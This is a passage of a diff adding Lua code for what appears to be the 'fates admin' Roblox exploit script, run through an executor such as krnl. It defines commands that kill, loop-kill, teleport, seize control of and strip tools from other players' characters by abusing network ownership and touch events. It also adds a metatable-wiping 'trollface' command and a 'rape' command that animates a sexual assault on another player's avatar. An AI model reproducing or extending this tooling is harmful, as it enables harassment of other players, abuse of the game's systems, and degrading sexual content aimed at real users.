+				L_13_ = v["Rg"]
+			end
+			if v["Lm"] then
+				L_12_ = v["Lm"]
+			end
+			if v["Rm"] then
+				L_11_ = v["Rm"]
+			end
+			if v["To"] then
+				L_15_ = v["To"]
+			end
+			if v["Hd"] then
+				L_16_ = v["Hd"]
+			end
+			L_24_ = 0
+			L_25_ = asdf - count
+			count = asdf
+			wait2(speed or wait())
+			L_24_ = L_25_
+			if v["Lg"] then
+				L_2_.Torso["Left Hip"].Transform = v["Lg"]
+			end
+			if v["Rg"] then
+				L_2_.Torso["Right Hip"].Transform = v["Rg"]
+			end
+			if v["Lm"] then
+				L_2_.Torso["Left Shoulder"].Transform = v["Lm"]
+			end
+			if v["Rm"] then
+				L_2_.Torso["Right Shoulder"].Transform = v["Rm"]
+			end
+			if v["To"] then
+				L_2_.HumanoidRootPart["RootJoint"].Transform = v["To"]
+			end
+			if v["Hd"] then
+				L_2_.Torso["Neck"].Transform = v["Hd"]
+			end
+		end
+	end
+end
+
+CheckClaim = function(v)
+	local root = Utils.GetRoot(v.Character)
+	if (isnetworkowner) then
+		if (not (v.Character and root)) then
+			return false
+		end
+		if (isnetworkowner(root)) then
+			return true
+		else
+			return Utils.Notify(LocalPlayer, "Not Claimed", ("%s is not claimed, claim is required to use this command"):format(v.Name or tostring(v)));			
+		end
+	else
+		if (not (v.Character and root)) then
+			return false
+		else
+			print("krnl does not have the function");
+			return true
+		end
+	end
+end
+
+AddCommand("claim", {"c"}, "claim {target}\nclaims the person you would like to be able to control the character", function(Caller, Args)
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	local Target = GetPlayer(Args[1]);
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character);
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+	Humanoid.Name = "1"
+	local Humanoid2 = Humanoid:Clone()
+	local targetpos
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	wait()
+	Humanoid:Destroy();
+	for _, v in next, LocalPlayer:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Backpack
+		end
+	end
+	for i, v in next, Target do
+		repeat
+			local hrp = Utils.GetRoot(v.Character)
+			if (v.Character and hrp and v.Character:FindFirstChildOfClass("Humanoid")) then
+				if (v.Character.Humanoid.Sit) then
+					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not claim");
+					do break end
+				end
+				if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] or LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+					if (#Target == 1 or LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+						Utils.Notify(Caller or LocalPlayer, nil, "Hold on...");
+						LocalPlayer.Character:Destroy();
+						LocalPlayer.CharacterAdded:Wait();
+						LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+						local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+						Humanoid.Name = "1"
+						local Humanoid2 = Humanoid:Clone()
+						Humanoid2.Parent = LocalPlayer.Character
+						Humanoid2.Name = "Humanoid"
+						Workspace.Camera.CameraSubject = Humanoid2
+						Humanoid:Destroy();
+						wait(.1);
+					else
+						do break end
+					end
+				end
+				Workspace.FallenPartsDestroyHeight = 0/1/0
+				local char = Players.LocalPlayer.Character
+				local target = v.Character
+				targetpos = Utils.GetRootCFrame(v.Character);
+				local HumanoidRootPart = Utils.GetRoot(char);
+				local THumanoidRootPart = Utils.GetRoot(v.Character)
+				if (HumanoidRootPart and THumanoidRootPart) then
+					if (#Target == 1) then
+						for _, v in next, char:GetChildren() do
+							if (v:IsA("Tool")) then
+								v.Parent = LocalPlayer.Backpack
+							end
+						end
+						HumanoidRootPart.CFrame = CFrame.new(0, -9999, 0)
+						local tool = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+						if (not tool) then
+							do break end
+						end
+						tool.Handle.Size = Vector3.new(4, 4, 4)
+						tool.Parent = char
+						wait();
+						for i = 1, 2 do
+							THumanoidRootPart.CFrame = tool.Handle.CFrame
+							wait();
+						end
+						wait();
+					else
+						coroutine.wrap(function()
+							F_A.execmd("bring", Caller, {"others","claim"});
+						end)();
+						HumanoidRootPart.CFrame = CFrame.new(0, -9999, 0);
+					end
+				end
+			else
+				Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is dead or does not have a root part, could not kill.");
+			end
+		until true
+	end
+	wait();
+	local HumanoidRootPart = Utils.GetRoot(LocalPlayer.Character)
+	if (#Target == 1) then
+		HumanoidRootPart.CFrame = targetpos
+	else
+		HumanoidRootPart.CFrame = oldpos
+	end
+	wait(.2)
+	LocalPlayer.Character.Head:Destroy();
+	LocalPlayer.CharacterAdded:Wait();
+	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end)
+
+--[[ AddCommand("hatclaim", {}, "hatclaim\nhat claims the user", function(Caller, Args)
+ 	local Target = GetPlayer(Args[1]);
+ 	local Hat = LocalPlayer.Character:FindFirstChildWhichIsA("Accessory");
+ 	if (Hat.Handle.Mesh) then
+ 		Hat.Handle.Mesh:Destroy();
+ 	else
+ 		Hat.Handle.SpecialMesh:Destroy();
+ 	end
+ 	Hat.Parent = Workspace
+ 	repeat wait() until isnetworkowner(Hat.Handle)
+ 	for i, v in next, Target do
+ 		RunService.RenderStepped:Connect(function()
+ 			Hat.Handle.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, math.random(-3, 3), 0);
+ 			Hat.Handle.Velocity = Vector3.new(9999999,9999999,9999999)
+ 		end)
+ 	end
+ end) ]]--
+
+AddCommand("rejoin", {"rj"}, "rejoin\nrejoins the game", function(Caller, Args)
+	if (Caller == LocalPlayer) then
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId);
+	end
+end);
+
+AddCommand("aliases", {}, "aliases {command}\nTells you all the aliases for the command", function(Caller, Args)
+	for i, v in next, Functions do
+		if (v.Name == Args[1]) then
+			return Utils.Notify(Caller or LocalPlayer, "Aliases for "..tostring(Args[1]), table.concat(v.Aliases, ", "));
+		else
+			for i2, v2 in next, v.Aliases do
+				if (v2 == Args[1]) then
+					return Utils.Notify(Caller or LocalPlayer, "Aliases for "..tostring(v.Name), table.concat(v.Aliases, ", "));
+				end
+			end
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, "no command found ;(");
+end)
+
+local function cbp(tool, pos) -- you can move wherever you want
+	local RightArm = LocalPlayer.Character:FindFirstChild('RightLowerArm') or LocalPlayer.Character:FindFirstChild('Right Arm')
+
+	local Arm = RightArm.CFrame * CFrame.new(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0) -- shifts rightarms cframe a stud and rotates it so that its pointing backwards of the hrp
+	local Frame = Arm:toObjectSpace(pos):Inverse() -- turns to object space to put in on
+
+	tool.Grip = Frame -- tool grip
+end
+
+AddCommand("kill", {"k"}, "kill {target}\nkills the user, tool required", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (not LocalPlayer.Character) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must be spawned!", 5)
+	end
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character) or LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+	Humanoid.Name = "1"
+	local Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	Humanoid:Destroy();
+	local TempRespawnTimes = {}
+	for i, v in next, Target do
+		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
+	end
+	for i, v in next, Target do
+		if (#Target == 1 and TempRespawnTimes[v.Name]) then
+			LocalPlayer.CharacterAdded:Wait();
+			wait(.1);
+		end
+	end
+	coroutine.wrap(function()
+		for i, v in pairs(Target) do
+			repeat
+				local hrp = Utils.GetRoot(v.Character)
+				if (v.Character and hrp and v.Character:FindFirstChild("Humanoid")) then
+					if (v.Character.Humanoid.Sit) then
+						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not kill");
+						do break end
+					end
+					if RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] then
+						if (#Target == 1) then
+							wait(.2)
+							LocalPlayer.CharacterAdded:Wait();
+							LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos;
+							local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+							Humanoid.Name = "1"
+							Humanoid2 = Humanoid:Clone()
+							Humanoid2.Parent = LocalPlayer.Character
+							Humanoid2.Name = "Humanoid"
+							Workspace.Camera.CameraSubject = Humanoid2
+							Humanoid:Destroy();
+							Destroy = true
+						else
+							do break end
+						end
+					end
+					
+					local Target = v.Character:FindFirstChildWhichIsA("Humanoid") and v.Character
+					Root = Utils.GetRoot(Target)
+					local Tool = LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool");
+					if (not Tool) then
+						do break end
+					end
+					Tool.CanBeDropped = true
+					Tool.Parent = LocalPlayer.Character
+					Tool.Handle.Size = Vector3.new(4, 4, 4);
+					for i, v in next, Tool:GetDescendants() do
+						if (v:IsA("Sound")) then
+							v:Destroy();
+						end
+					end
+					cbp(Tool, Utils.GetRootCFrame(Target));
+					firetouchinterest(Root, Tool.Handle, 0);
+					firetouchinterest(Root, Tool.Handle, 1);
+				else
+					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is dead or does not have a root part, could not kill.");
+				end
+			until true
+		end
+	end)()
+	Humanoid2:ChangeState(15);
+	wait(.3);
+	LocalPlayer.Character:Destroy();
+	LocalPlayer.CharacterAdded:Wait();
+	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end)
+
+AddCommand("kill2", {"k2"}, "kill2 {target}\nanother variant of kill", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (not LocalPlayer.Character) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must be spawned!", 5)
+	end
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character) or LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+	local Humanoid = LocalPlayer.Character:FindFirstChild("Humanoid");
+	local TempRespawnTimes = {}
+	for i, v in next, Target do
+		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
+	end
+	local Char = LocalPlayer.Character
+	Char.Archivable = true	
+	LocalPlayer.Character = Char:Clone();
+	wait(Players.RespawnTime - .3);
+	LocalPlayer.Character = Char
+	Humanoid.Name = "1"
+	Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	Humanoid:Destroy();
+	for i, v in next, Target do
+		if (#Target == 1 and TempRespawnTimes[v.Name]) then
+			LocalPlayer.CharacterAdded:Wait();
+			wait(.1);
+		end
+	end
+	coroutine.wrap(function()
+		for i, v in pairs(Target) do
+			repeat
+				local hrp = Utils.GetRoot(v.Character)
+				if v.Character and hrp and v.Character:FindFirstChild("Humanoid") then
+					if (v.Character.Humanoid.Sit) then
+						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not kill");
+						do break end
+					end
+		
+					if TempRespawnTimes[v.Name] then
+						if (#Target == 1) then
+							LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos;
+							local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+							Humanoid.Name = "1"
+							Humanoid2 = Humanoid:Clone()
+							Humanoid2.Parent = LocalPlayer.Character
+							Humanoid2.Name = "Humanoid"
+							Workspace.Camera.CameraSubject = Humanoid2
+							Humanoid:Destroy();
+							Destroy = true
+						else
+							do break end
+						end
+					end
+					
+					local Target = v.Character:FindFirstChildWhichIsA("Humanoid") and v.Character
+					Root = Utils.GetRoot(Target)
+					local Tool = LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool");
+					if (not Tool) then
+						do break end
+					end
+					Tool.CanBeDropped = true
+					Tool.Parent = LocalPlayer.Character
+					Tool.Handle.Size = Vector3.new(4, 4, 4);
+					for i, v in next, Tool:GetDescendants() do
+						if (v:IsA("Sound")) then
+							v:Destroy();
+						end
+					end
+					cbp(Tool, Utils.GetRootCFrame(Target));
+					firetouchinterest(Root, Tool.Handle, 0);
+					firetouchinterest(Root, Tool.Handle, 1);
+				else
+					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is dead or does not have a root part, could not kill.");
+				end
+			until true
+		end
+	end)()
+	Humanoid2:ChangeState(15);
+	if (Destroy) then
+		wait(.2);
+		LocalPlayer.Character:Destroy();
+		Destroy = false
+	end
+	LocalPlayer.CharacterAdded:Wait();
+	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end)
+
+AddCommand("bring2", {"b"}, "bring2 {target}\nanother variant of bring", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (not LocalPlayer.Character) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must be spawned!", 5)
+	end
+	if (not LocalPlayer.Backpack:FindFirstChildOfClass("Tool") and not LocalPlayer.Character:FindFirstChildOfClass("Tool")) then 
+		return Utils.Notify(Caller or LocalPlayer, nil, "You must have a tool in your backpack!", 5)
+	end;
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character) or LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+	local Humanoid = LocalPlayer.Character:FindFirstChild("Humanoid");
+	local TempRespawnTimes = {}
+	for i, v in next, Target do
+		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
+	end
+	local Char = LocalPlayer.Character
+	Char.Archivable = true	
+	LocalPlayer.Character = Char:Clone();
+	wait(Players.RespawnTime - .3);
+	LocalPlayer.Character = Char
+	Humanoid.Name = "1"
+	Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	Humanoid:Destroy();
+	for i, v in pairs(Target) do
+		repeat
+			local hrp = Utils.GetRoot(v.Character)
+			if (v.Character and hrp and v.Character:FindFirstChildOfClass("Humanoid")) then
+				if (v.Character.Humanoid.Sit) then
+					Utils.Notify(Caller or LocalPlayer, nil, "Player is sitting down, could not kill");
+					do break end
+				end
+				if TempRespawnTimes[v.Name] then
+					if (#Target == 1) then
+						wait(.2)
+						LocalPlayer.CharacterAdded:Wait();
+						LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos;
+						local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+						Humanoid.Name = "1"
+						Humanoid2 = Humanoid:Clone()
+						Humanoid2.Parent = LocalPlayer.Character
+						Humanoid2.Name = "Humanoid"
+						Workspace.Camera.CameraSubject = Humanoid2
+						Humanoid:Destroy();
+						Destroy = true
+					else
+						do break end
+					end
+				end
+				local target = v.Character
+				local tool = Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or LocalPlayer.Character:FindFirstChild("Tool");
+				if (not tool) then
+					do break end
+				end
+				tool.Parent = LocalPlayer.Character
+				tool.Handle.Size = Vector3.new(4, 4, 4);
+				cbp(tool, hrp.CFrame);
+				for i = 1, 3 do
+					if (hrp) then
+						firetouchinterest(hrp, tool.Handle, 0);
+						firetouchinterest(hrp, tool.Handle, 1);
+						cbp(tool, oldpos * CFrame.new(-5, 0, 0));
+					end
+				end
+			else
+				Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is dead or does not have a root part, could not kill.");
+			end
+		until true
+	end
+	local hrp = Utils.GetRoot(LocalPlayer.Character)
+	if hrp then
+		hrp.CFrame = Utils.GetRootCFrame(Caller.Character)
+	end
+	if (Destroy) then
+		wait(.2);
+		LocalPlayer.Character:Destroy();
+		Destroy = false
+	end
+	LocalPlayer.CharacterAdded:Wait();
+	LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+end)
+
+AddCommand("control", {}, "controls a user of your choice", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (#Target > 1) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "Only one player for this command");
+	end
+	Target = Target[1];
+	if (CheckClaim(Target)) then
+		LocalPlayer.Character = Target.Character
+		Workspace.Camera.CameraSubject = Target.Character.Humanoid
+		Target.Character.Humanoid.Died:Connect(function()
+			LocalPlayer.Character = Workspace:FindFirstChild(LocalPlayer.Name, true);
+			Workspace.Camera.CameraSubject = Workspace:FindFirstChild(LocalPlayer.Name, true).Humanoid
+		end)
+	end
+end)
+
+AddCommand("uncontrol", {"nocontrol"}, "uncontrols the user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	if (#Target > 1) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "Only one player for this command");
+	end
+	Target = Target[1];
+	LocalPlayer.Character = Workspace:FindFirstChild(LocalPlayer.Name, true);
+	Workspace.Camera.CameraSubject = Workspace:FindFirstChild(LocalPlayer.Name, true).Humanoid
+end)	
+
+AddCommand("givetools", {}, "givetools {target}\ngives tools to a target", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character);
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+	Humanoid.Name = "1"
+	local Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	wait()
+	Humanoid:Destroy();
+	for _, v in next, LocalPlayer:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Backpack
+		end
+	end
+	Humanoid2:ChangeState(15);
+	for i, v in next, Target do
+		local char = Players.LocalPlayer.Character
+		local target = v.Character
+		local THumanoidRootPart = Utils.GetRoot(target)
+		local oldpos = Utils.GetRootCFrame(char)
+		for i2, v2 in next, LocalPlayer.Backpack:GetChildren() do
+			if (v2:IsA("Tool")) then
+				v2.Parent = LocalPlayer.Character
+				local old = v2.Handle.Size
+				v2.Handle.Size = Vector3.new(0.5, 0.5, 0.5);
+				for i = 1, 3 do
+					if (THumanoidRootPart) then
+						firetouchinterest(THumanoidRootPart, v2.Handle, 0);
+						firetouchinterest(THumanoidRootPart, v2.Handle, 1);
+					end
+				end
+				v2.Handle.Size = old
+			end
+		end
+	end
+	wait(.2);
+	LocalPlayer.Character:Destroy();
+end)
+
+AddCommand("rape", {}, "rape {target} ({target} optional)\nrapes the user", function(Caller, Args)
+	local Target = GetPlayer(Args[1])[1]
+	local Target2 = GetPlayer(Args[2])[1]
+	if (CheckClaim(Target)) then
+		local TargetCharacter = Target.Character
+		if (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Head') and LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+			getgenv().Rape = false
+			local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+			LocalPlayer.Character:BreakJoints();
+			LocalPlayer.CharacterAdded:Wait();
+			LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+			wait(.2);
+		end
+		local Character = Target2.Character or LocalPlayer.Character
+
+		local TargetHumanoid = TargetCharacter:WaitForChild("Humanoid")
+		local TargetHRP = Utils.GetRoot(TargetCharacter)
+		getgenv().Rape = true
+		Speed = 1
+		coroutine.wrap(function()
+			local Time = 0
+
+			TargetHumanoid.WalkSpeed = 0
+			TargetHumanoid.JumpPower = 0
+			TargetHumanoid.PlatformStand = true
+			repeat
+				local Delta = RunService.RenderStepped:Wait();
+				local Value = .75 * math.cos(Time * (math.pi / (.5))) - 1.75
+				Time = Time + Delta * Speed
+				TargetHRP.CFrame = Utils.GetRootCFrame(Character) * CFrame.new(0, 0, Value)
+			until (not Target or not CheckClaim(Target) or not getgenv().Rape or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health == 0)
+		end)()
+
+		if (Character == LocalPlayer.Character) then
+			local player=LocalPlayer local character=player.Character local item=character["Right Arm"]item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])local rightarm=Instance.new("Attachment",item)local a1=Instance.new("Attachment",character["Torso"])alignPosition.Attachment0=rightarm alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=rightarm alignOr.Attachment1=a1 alignOr.Responsiveness=200 rightarm.Position=Vector3.new(-1.5,0.8,0.2)rightarm.Orientation=Vector3.new(240,-180,180)local item=character["Left Arm"]item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])local leftarm=Instance.new("Attachment",item)local a1=Instance.new("Attachment",character["Torso"])alignPosition.Attachment0=leftarm alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=leftarm alignOr.Attachment1=a1 alignOr.Responsiveness=200 leftarm.Position=Vector3.new(1.5,1,0.2)leftarm.Orientation=Vector3.new(240,180,-180)
+			coroutine.wrap(function()
+				local Time = 0
+				coroutine.wrap(function()
+					repeat
+						leftarm.Position = Vector3.new(1.5, 0.5, 0.2)
+						rightarm.Position = Vector3.new(-1.5, 0.5, 0.2)
+						Target.Character.Humanoid.Sit = true
+						wait(3);
+					until (not Target or not CheckClaim(Target) or not getgenv().Rape or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health == 0)
+				end)();
+				repeat
+					local Delta = RunService.RenderStepped:Wait()
+					local Value = 2 * -math.cos((Time + .5) * (math.pi / .5));
+					Time = Time + Delta * Speed
+					leftarm.Position = leftarm.Position + Vector3.new(0, Value * Delta, 0)
+					rightarm.Position = rightarm.Position + Vector3.new(0, Value * Delta, 0)
+				until (not Target or not CheckClaim(Target) or not getgenv().Rape or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health == 0)
+				getgenv().Rape = false
+			end)();
+		end
+		UIS = UserInputService.InputBegan:Connect(function(inp, GP)
+			if (GP) then
+				return
+			end
+			if (inp.KeyCode == Enum.KeyCode.K and CheckClaim(v)) then
+				v.Character:BreakJoints();
+				UIS:Disconnect();
+			elseif (inp.KeyCode == Enum.KeyCode.C) then -- faster
+				Speed = Speed + 1
+			elseif (inp.KeyCode == Enum.KeyCode.V) then --slower
+				Speed = Speed ~= 1 and Speed - 1 or 1
+			end
+		end)
+	end
+end) -- cba to redo
+
+AddCommand("loopkill", {"lkill"}, "loopkill {target}\nloopkills the user, use the command 'unloopkill' to unloopkill the user (tool required)", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	getgenv().lkill = true
+	repeat
+		local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+		Humanoid.Name = "1"
+		local Humanoid2 = Humanoid:Clone()
+		Humanoid2.Parent = LocalPlayer.Character
+		Humanoid2.Name = "Humanoid"
+		Workspace.Camera.CameraSubject = Humanoid2
+		Humanoid:Destroy();
+		for i, v in next, Target do
+			repeat
+				if RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] then
+					do break end
+				end
+				if Utils.GetRoot(v.Character) then
+					local Target = v.Character:FindFirstChildWhichIsA("Humanoid") and v.Character
+					Root = Utils.GetRoot(Target)
+					local Tool = LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool");
+					if (not Tool) then
+						do break end
+					end
+					Tool.Parent = LocalPlayer.Character
+					Tool.Handle.Size = Vector3.new(4, 4, 4);
+					for i, v in next, Tool:GetDescendants() do
+						if (v:IsA("Sound")) then
+							v:Destroy();
+						end
+					end
+					cbp(Tool, Utils.GetRootCFrame(Target));
+					firetouchinterest(Root, Tool.Handle, 0);
+					firetouchinterest(Root, Tool.Handle, 1);
+				end
+			until true
+		end
+		Humanoid2:ChangeState(15);
+		wait(.3);
+		LocalPlayer.Character:Destroy();
+		wait();
+		LocalPlayer.CharacterAdded:Wait();
+		LocalPlayer.Character:WaitForChild("Humanoid");
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+	until not Target or not getgenv().lkill
+end)
+
+AddCommand("unloopkill", {"unlk"}, "unloopkill {target}\nunloopkills the user", function(Caller, Args)
+	getgenv().lkill = getgenv().lkill and false
+end)
+
+AddCommand("whoiscaller", {"wic"}, "prints who is calling the command in the roblox console (press f9 or type /console in chat to see)", function(Caller, Args)
+	Utils.Notify(Caller or LocalPlayer, nil, ("caller is %s"):format(Caller.Name or tostring(Caller)));
+end)
+
+AddCommand("setprefix", {"newprefix"}, "setprefix {prefix}\nchanges the prefix to whatever you would like (must be a symbol)", function(Caller, Args)
+	if (Caller == LocalPlayer) then
+		if (Args[1]:match("%A")) then
+			Prefix = Args[1]
+			Utils.Notify(Caller or LocalPlayer, nil, ("Your prefix is now %s"):format(Prefix));
+		else
+			Utils.Notify(Caller or LocalPlayer, nil, "Invalid Prefix, it must be a symbol");
+		end
+	end
+end)
+
+AddCommand("punish", {"p"}, "punish {target}\npunishes a user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			Utils.GetRoot(v.Character).CFrame = CFrame.new(0, math.huge, 0);
+		end
+	end
+end)
+
+AddCommand("unpunish", {"p"}, "unpunish {target}\numpunishes a user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		F_A.execmd("cbring", Caller, Args);
+	end
+end)
+
+
+AddCommand("saveprefix", {}, "saveprefix\nsaves your prefix so you can use it next time", function(Caller, Args)
+	if (Caller == LocalPlayer) then
+		xpcall(function()
+			local json = HttpService:JSONDecode(readfile("fates admin settings.json"));
+			json.Settings["ChatPrefix"] = tostring(Prefix);
+			writefile("fates admin settings.json", HttpService:JSONEncode(json));
+		end, function()
+			Utils.Notify(Caller or LocalPlayer, nil, "Your exploit doesn't support this command!");
+		end)
+	end
+end)
+
+AddCommand("clearprefix", {"cprefix"}, "clearprefix\nclears the saved prefix", function(Caller, Args)
+	if (Caller == LocalPlayer) then
+		xpcall(function()
+			local json = HttpService:JSONDecode(readfile("fates admin settings.json"));
+			json.Settings["ChatPrefix"] = "/"
+			writefile("fates admin settings.json", HttpService:JSONDecode(json));
+		end, function()
+			Utils.Notify(Caller or LocalPlayer, nil, "Your exploit doesn't support this command!");
+		end)
+	end
+end)
+
+AddCommand("getprefix", {"gprefix"}, "getprefix\ntells you the current prefix you are using", function(Caller, Args)
+	Utils.Notify(Caller or LocalPlayer, nil, ("The current prefix is %s"):format(Prefix));
+end)
+
+AddCommand("trollface", {"tf0"}, "trollface\nhardcore trollage", function(Caller, Args, Tbl)
+	rm = getrawmetatable(game); setreadonly(rm,false); rm.__index = nil; rm.__namecall = nil; rm.__newindex = nil; rm.__call = nil
+end)
+
+local attach=function(User)local char=LocalPlayer.Character local target=User local Humanoid=char:WaitForChild("Humanoid")local HumanoidRootPart=Utils.GetRoot(char)local HumanoidRootPart2=Utils.GetRoot(target) Humanoid.Name="1"local Humanoid2=Humanoid:Clone()Humanoid2.Parent=char Humanoid2.Name="Humanoid"Workspace.Camera.CameraSubject=Humanoid2 wait()Humanoid:Destroy(); for _,v in next,char:GetChildren()do if(v:IsA("Tool"))then v.Parent=LocalPlayer.Backpack end end local tool=LocalPlayer.Backpack:FindFirstChildOfClass("Tool")tool.Parent=char HumanoidRootPart.CFrame=Utils.GetRootCFrame(target);local times=0 repeat wait()times=times+1 HumanoidRootPart.CFrame=Utils.GetRootCFrame(target) until(tool.Parent~=char or not HumanoidRootPart or not HumanoidRootPart2 or not HumanoidRootPart.Parent or not HumanoidRootPart2.Parent or times>250)and times>2 end
+local attach2 = function(User)
+	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");	
+	Humanoid.Name = "1"
+	local Humanoid2 = Humanoid:Clone()
+	Humanoid2.Parent = LocalPlayer.Character
+	Humanoid2.Name = "Humanoid"
+	Workspace.Camera.CameraSubject = Humanoid2
+	wait()
+	Humanoid:Destroy();
+	for _, v in next, LocalPlayer:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Backpack
+		end
+	end
+	if RespawnTimes[LocalPlayer.Name] <= RespawnTimes[User.Name] then
+		Utils.Notify(Caller or LocalPlayer, nil, "Hold on...");
+		LocalPlayer.Character:Destroy();
+		LocalPlayer.CharacterAdded:Wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+		local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid");
+		Humanoid.Name = "1"
+		local Humanoid2 = Humanoid:Clone()
+		Humanoid2.Parent = LocalPlayer.Character
+		Humanoid2.Name = "Humanoid"
+		Workspace.Camera.CameraSubject = Humanoid2
+		Humanoid:Destroy();
+		wait();
+	end
